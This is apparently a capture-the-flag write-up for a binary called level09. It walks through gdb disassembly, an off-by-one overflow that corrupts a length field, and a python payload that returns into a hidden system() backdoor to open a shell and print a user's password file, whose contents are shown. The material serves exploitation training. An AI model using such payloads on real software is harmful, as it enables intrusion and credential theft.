# Level09


These buffers will be fill with 'set_username' and 'set_msg'.

In the function 'set_username', a local buffer of 0x80(128) bytes is used to store the username. Then, 0x29(41) bytes of this local buffer are copied to the buffer of username in the struct. Since the buffer of username in the struct is 0x28(40) bytes long, 1 byte is copied after and will replace the value of the message length.

In the function 'set_msg', a local buffer of 0x400 bytes is used to store the message of the user and 'strncpy' will use the value of the message length in the struct to fill the buffer of message inside the struct. This means that we can use a buffer overflow to rewrite the old eip of 'handle_msg' !

To rewrite old eip, we need to write a username of 0x28(40) characters, the length to overflow and rewrite old eip (sizeof(struct s_mail) + padding + old ebp + old eip -> 0xd0), use a newline for the end of the buffer, fill the memory until the new address of old eip.

For the new address, there's a hidden function which is called 'secret_backdoor'. It read a command on stdin and use it for the 'system' call. For the buffer overflow, we will use the address of this function (0x000055555555488c) to exploit this binary.



# First we can see a hidden function `secret_backdoor`
gdb> disass secret_backdoor
[...]
   0x0000555555554894 <+8>:	mov    rax,QWORD PTR [rip+0x20171d] # 0x555555755fb8  ; stdin
   0x000055555555489b <+15>:	mov    rax,QWORD PTR [rax]
   0x000055555555489e <+18>:	mov    rdx,rax
   0x00005555555548a1 <+21>:	lea    rax,[rbp-0x80]
   0x00005555555548a5 <+25>:	mov    esi,0x80
   0x00005555555548aa <+30>:	mov    rdi,rax
   0x00005555555548ad <+33>:	call   0x555555554770 <fgets@plt>                     ; fgets(shellcode, 0x80, stdin)
   0x00005555555548b2 <+38>:	lea    rax,[rbp-0x80]
   0x00005555555548b6 <+42>:	mov    rdi,rax
   0x00005555555548b9 <+45>:	call   0x555555554740 <system@plt>                    ; system(shellcode)
[...]
# It executes whatever we write in the stdin

gdb> disass handle_msg
[...]
   0x00005555555548cb <+11>:	lea    rax,[rbp-0xc0]                           ; struct msg 192 bytes
   0x00005555555548d2 <+18>:	add    rax,0x8c                                 ; 140 bytes
   0x00005555555548d8 <+24>:	mov    QWORD PTR [rax],0x0
   0x00005555555548df <+31>:	mov    QWORD PTR [rax+0x8],0x0
   0x00005555555548e7 <+39>:	mov    QWORD PTR [rax+0x10],0x0
   0x00005555555548ef <+47>:	mov    QWORD PTR [rax+0x18],0x0
   0x00005555555548f7 <+55>:	mov    QWORD PTR [rax+0x20],0x0                 ; 40 bytes
   0x00005555555548ff <+63>:	mov    DWORD PTR [rbp-0xc],0x8c                 ; 8 bytes
[...]
# Here we can see a struct which may look like this
typedef struct msg
{
  char    content[140];
  char    username[40];
  size_t  size;
} msg_t;

gdb> disass set_username
[...]
   0x0000555555554a38 <+107>:	call   0x555555554770 <fgets@plt>                     ; fgets(username, 128, stdin)
   0x0000555555554a3d <+112>:	mov    DWORD PTR [rbp-0x4],0x0                        ; idx = 0
   0x0000555555554a44 <+119>:	jmp    0x555555554a6a <set_username+157>
   0x0000555555554a46 <+121>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555554a49 <+124>:	cdqe
   0x0000555555554a4b <+126>:	movzx  ecx,BYTE PTR [rbp+rax*1-0x90]
   0x0000555555554a53 <+134>:	mov    rdx,QWORD PTR [rbp-0x98]
   0x0000555555554a5a <+141>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555554a5d <+144>:	cdqe
   0x0000555555554a5f <+146>:	mov    BYTE PTR [rdx+rax*1+0x8c],cl
   0x0000555555554a66 <+153>:	add    DWORD PTR [rbp-0x4],0x1                        ; idx += 1
   0x0000555555554a6a <+157>:	cmp    DWORD PTR [rbp-0x4],0x28                       ; if (idx > 40)
   0x0000555555554a6e <+161>:	jg     0x555555554a81 <set_username+180>
   0x0000555555554a70 <+163>:	mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555554a73 <+166>:	cdqe
   0x0000555555554a75 <+168>:	movzx  eax,BYTE PTR [rbp+rax*1-0x90]
   0x0000555555554a7d <+176>:	test   al,al
   0x0000555555554a7f <+178>:	jne    0x555555554a46 <set_username+121>
[...]
# In the `set_username` function we can see that 41 bytes can be written at msg->username which is only 40 bytes long
# We can overflow this to overwrite the next variable which is the size for the strncpy in the `set_msg` function

gdb> disass set_msg
[...]
   0x0000555555554981 <+79>:	mov    rax,QWORD PTR [rip+0x201630] # 0x555555755fb8  ; stdin
   0x0000555555554988 <+86>:	mov    rax,QWORD PTR [rax]
   0x000055555555498b <+89>:	mov    rdx,rax
   0x000055555555498e <+92>:	lea    rax,[rbp-0x400]                                ; local_msg
   0x0000555555554995 <+99>:	mov    esi,0x400
   0x000055555555499a <+104>:	mov    rdi,rax
   0x000055555555499d <+107>:	call   0x555555554770 <fgets@plt>                     ; fgets(local_msg, 0x400, stdin)
   0x00005555555549a2 <+112>:	mov    rax,QWORD PTR [rbp-0x408]                      ; msg
   0x00005555555549a9 <+119>:	mov    eax,DWORD PTR [rax+0xb4]
   0x00005555555549af <+125>:	movsxd rdx,eax
   0x00005555555549b2 <+128>:	lea    rcx,[rbp-0x400]                                ; local_msg
   0x00005555555549b9 <+135>:	mov    rax,QWORD PTR [rbp-0x408]                      ; msg
   0x00005555555549c0 <+142>:	mov    rsi,rcx
   0x00005555555549c3 <+145>:	mov    rdi,rax
   0x00005555555549c6 <+148>:	call   0x555555554720 <strncpy@plt>                   ; strcpy(msg->content, local_msg, msg->size)
[...]

# Lets try a pattern search to see if we can overwrite the next instruction to be executed
gdb> pattern create 256
$> python -c "print 'A' * 40 + '\xff' + '\n' + 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G'" > /tmp/pl
# Here we write 40 'A' byte then we overwrite the size in the struct with '\xff' == 255 > 140 (the size of the content field) and then we append a '\n' for the `fgets`
gdb> r < /tmp/pl
SIGSEGV
gdb> pattern search
[...]
Registers contain pattern buffer:
RDI+52 found at offset: 69
RBP+0 found at offset: 201
[...]
# Nice we found offset 201 (- 1) to overwrtie the next instruction to be executed

# We just need to find the address of the backdoor function
gdb> x secret_backdoor
0x55555555488c <secret_backdoor>

0x55555555488c <=> \x8c\x48\x55\x55\x55\x55\x00\x00

# Then we prepare our payload
$> (python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200  + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'" ; cat) | ./level09
$ cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE